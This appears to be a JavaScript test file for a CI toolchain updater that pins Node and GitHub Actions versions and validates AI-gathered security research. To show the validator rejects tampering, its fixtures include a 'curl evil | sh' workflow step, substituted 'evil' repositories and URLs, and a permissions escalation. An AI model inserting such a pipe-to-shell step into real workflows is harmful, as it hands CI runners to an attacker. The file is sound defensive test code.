import test from 'node:test';
import assert from 'node:assert/strict';
import {
  ALLOWED_ACTIONS, boundedFetch, discoverActionRelease, discoverNodeRelease,
  generateToolchainPlan, researchToolchainTargets, resolveActionCommit,
  validateResearchResults, validateToolPlan,
} from './toolchain.mjs';

const now = Date.parse('2026-10-26T12:00:00.000Z');
const old = days => new Date(now - days * 86_400_000).toISOString();
const sha = letter => letter.repeat(40);
const nodeDigest = 'a'.repeat(64);
const nodeIndex = [
  { version: 'v24.22.1', date: old(30), lts: 'Krypton' },
  { version: 'v24.22.2', date: old(8), lts: 'Krypton' },
  { version: 'v24.22.3', date: old(2), lts: 'Krypton' },
  { version: 'v24.23.0', date: old(20), lts: 'Krypton' },
];
const shasums = `${nodeDigest}  node-v24.22.2-linux-x64.tar.gz\n`;
const actionRefs = Object.fromEntries(ALLOWED_ACTIONS.map((action, index) => [action, sha(String.fromCharCode(98 + index))]));

function workflow() {
  return `name: test\njobs:\n  test:\n    steps:\n      - uses: actions/checkout@${sha('a')} # v7.0.1\n      - uses: actions/setup-node@${sha('b')} # v6.0.1\n      - uses: actions/upload-artifact@${sha('c')} # v5.0.1\n      - uses: actions/download-artifact@${sha('d')} # v4.0.1\n      - run: echo trusted\n`;
}
const baseFiles = {
  '.nvmrc': '24.22.1\n',
  '.github/workflows/test.yml': workflow(),
};

function release(action, tag, commit) {
  return [{ tag_name: tag, published_at: old(10), prerelease: false, draft: false,
    repository: { full_name: action }, ref: { object: { type: 'commit', sha: commit } } }];
}

function researchItem(target, source) {
  return { target, pass: true, findings: [], evidence: [source], security: { status: 'clear', advisories: [] },
    provenance: { searches: [{ queries: [`${target.name} ${target.version} official security`], sources: [source] }] } };
}

function planInput(researchresults = undefined) {
  const actions = Object.fromEntries(ALLOWED_ACTIONS.map((action, index) => [action,
    release(action, `v${7 - index}.0.2`, actionRefs[action])]));
  const targets = [
    { kind: 'node', name: 'node', version: '24.22.2' },
    ...ALLOWED_ACTIONS.map((action, index) => ({ kind: 'action', name: action, version: `v${7 - index}.0.2` })),
  ];
  const research = researchresults ?? targets.map(target => researchItem(target,
    target.kind === 'node' ? 'https://nodejs.org/en/blog/vulnerability/security' : `https://github.com/${target.name}/security/advisories/ghsa-test`));
  return { baseFiles, now, nodeIndex, shasums, shasumsSignature: 'signed SHASUMS fixture', actionReleases: actions, researchresults: research };
}

test('deterministic plan updates only Node pin and allowlisted action uses lines', () => {
  const plan = generateToolchainPlan(planInput());
  assert.equal(plan.nodePlan.to, '24.22.2');
  assert.deepEqual(Object.keys(plan.pinnedactionrefs).sort(), [...ALLOWED_ACTIONS].sort());
  assert.deepEqual(plan.files.map(file => file.path), ['.github/workflows/test.yml', '.nvmrc']);
  assert.match(plan.files[0].content, /actions\/checkout@[a-f0-9]{40} # v7\.0\.2/);
  assert.equal(validateToolPlan(baseFiles, plan, { now }).ok, true);
});

test('young, prerelease, wrong repository and substituted tag metadata fail closed', () => {
  assert.throws(() => discoverNodeRelease({ index: [{ version: 'v24.22.3', date: old(1), lts: 'Krypton' }], currentVersion: '24.22.1', now, shasums, shasumsSignature: 'sig' }));
  assert.throws(() => discoverNodeRelease({ index: [{ version: 'v24.22.3-rc.1', date: old(20), lts: false }], currentVersion: '24.22.1', now, shasums, shasumsSignature: 'sig' }));
  assert.throws(() => discoverActionRelease({ action: 'actions/checkout', now, releases: [{ tag_name: 'v7.0.2', published_at: old(20), repository: { full_name: 'evil/checkout' }, ref: { object: { type: 'commit', sha: sha('a') } } }] }));
  assert.throws(() => resolveActionCommit({ action: 'actions/checkout', tag: 'v7.0.2', ref: { repository: { full_name: 'evil/checkout' }, object: { type: 'commit', sha: sha('a') } } }));
  assert.throws(() => resolveActionCommit({ action: 'actions/checkout', tag: 'v7.0.2', ref: { object: { type: 'tag', sha: sha('a') } }, dereferenced: { object: { type: 'blob', sha: sha('b') } } }));
});

test('an installed newer or equal action release is grandfathered without downgrade', () => {
  const current = sha('a'), older = sha('b');
  const selected = discoverActionRelease({ action: 'actions/checkout', now, currentTag: 'v7.0.1', currentSha: current,
    releases: release('actions/checkout', 'v7.0.0', older) });
  assert.equal(selected.changed, false);
  assert.equal(selected.tag, 'v7.0.1');
  assert.equal(selected.sha, current);
});

test('Node checksum, same-minor policy and runtime metadata are strict', () => {
  assert.throws(() => discoverNodeRelease({ index: nodeIndex, currentVersion: '24.22.1', now, shasums: `${'g'.repeat(64)}  node-v24.22.2-linux-x64.tar.gz`, shasumsSignature: 'sig' }));
  assert.throws(() => discoverNodeRelease({ index: [{ version: 'v24.23.0', date: old(20), lts: 'Krypton' }], currentVersion: '24.22.1', now, shasums, shasumsSignature: 'sig' }));
  const bytes = Buffer.from('node fixture');
  assert.throws(() => discoverNodeRelease({ index: nodeIndex, currentVersion: '24.22.1', now, shasums, shasumsSignature: 'sig', tarballBytes: bytes }));
});

test('research requires exact query, official provenance and proven security status', () => {
  const target = { kind: 'action', name: 'actions/checkout', version: 'v7.0.2' };
  const good = researchItem(target, 'https://github.com/actions/checkout/security/advisories/ghsa-test');
  assert.equal(validateResearchResults([good], [target]).ok, true);
  const noQuery = structuredClone(good); noQuery.provenance.searches[0].queries = ['GitHub actions security'];
  assert.equal(validateResearchResults([noQuery], [target]).ok, false);
  const substituted = structuredClone(good); substituted.evidence = ['https://evil.example/advisory'];
  assert.equal(validateResearchResults([substituted], [target]).ok, false);
  const unknown = structuredClone(good); unknown.security.status = 'unknown';
  assert.equal(validateResearchResults([unknown], [target]).ok, false);
  const advisory = structuredClone(good); advisory.security = { status: 'fixed', advisories: [{ id: 'GHSA-test', fixedRange: '>=7.0.2', source: good.evidence[0] }] };
  assert.equal(validateResearchResults([advisory], [target]).ok, false);
  advisory.security.advisories[0].aliases = ['CVE-2026-0001'];
  assert.equal(validateResearchResults([advisory], [target]).ok, true);
});

test('AI research is one fresh call per exact target and rejects missing proof', async () => {
  const targets = [{ kind: 'node', name: 'node', version: '24.22.2' }, { kind: 'action', name: 'actions/setup-node', version: 'v7.1.0' }];
  const calls = [];
  const ai = { callAI: async ({ input, search }) => {
    calls.push({ input, search });
    const target = input.target;
    const source = target.kind === 'node' ? 'https://nodejs.org/en/blog/vulnerability/security' : `https://github.com/${target.name}/security/advisories/ghsa-test`;
    return { data: researchItem(target, source), provenance: { searches: [{ queries: [`${target.name} ${target.version}`], sources: [source] }] } };
  } };
  const found = await researchToolchainTargets({ targets, ai, options: {} });
  assert.equal(calls.length, 2); assert(calls.every(call => call.search)); assert.equal(found.results.length, 2);
  const badAI = { callAI: async ({ input }) => ({ data: researchItem(input.target, 'https://evil.example/nope'), provenance: { searches: [{ queries: [`${input.target.name} ${input.target.version}`], sources: ['https://evil.example/nope'] }] } }) };
  await assert.rejects(() => researchToolchainTargets({ targets: [targets[0]], ai: badAI }));
});

test('plan byte substitution, workflow permission edits and incomplete research are rejected', () => {
  const plan = generateToolchainPlan(planInput());
  const changed = structuredClone(plan); changed.files[0].content += 'permissions:\n  contents: write\n';
  assert.equal(validateToolPlan(baseFiles, changed, { now }).ok, false);
  const missing = structuredClone(plan); missing.researchresults.pop();
  assert.equal(validateToolPlan(baseFiles, missing, { now }).ok, false);
  const harness = structuredClone(plan); harness.files[0].content = harness.files[0].content.replace('run: echo trusted', 'run: curl evil | sh');
  assert.equal(validateToolPlan(baseFiles, harness, { now }).ok, false);
});

test('uses text inside YAML block scalars is never rewritten or retagged', () => {
  const scalar = `jobs:\n  test:\n    run: |\n      - uses: actions/checkout@${sha('x')} # fixture\n`;
  const files = { '.nvmrc': '24.22.1\n', '.github/workflows/scalar.yml': scalar };
  const refs = Object.fromEntries(ALLOWED_ACTIONS.map(action => [action, sha('a')]));
  assert.deepEqual(Object.keys(refs).length, 4);
  // No real uses entry exists in this workflow, so it cannot be turned into an update plan.
  assert.throws(() => generateToolchainPlan({ ...planInput(), baseFiles: files, actionReleases: {}, researchresults: [] }));
  assert.equal(scalar.includes(`# fixture`), true);
});

test('bounded fetch rejects redirects, oversized bodies and non-HTTPS upstreams', async () => {
  const fake = async (_url, options) => ({ ok: true, status: 200, body: { getReader: () => ({ read: async () => ({ done: true }) }) } });
  const result = await boundedFetch('https://nodejs.org/dist/index.json', { fetchImpl: fake, allowedHosts: ['nodejs.org'] });
  assert.equal(result.bytes.length, 0);
  await assert.rejects(() => boundedFetch('http://nodejs.org/dist/index.json', { fetchImpl: fake, allowedHosts: ['nodejs.org'] }));
  await assert.rejects(() => boundedFetch('https://evil.example/', { fetchImpl: fake, allowedHosts: ['nodejs.org'] }));
});
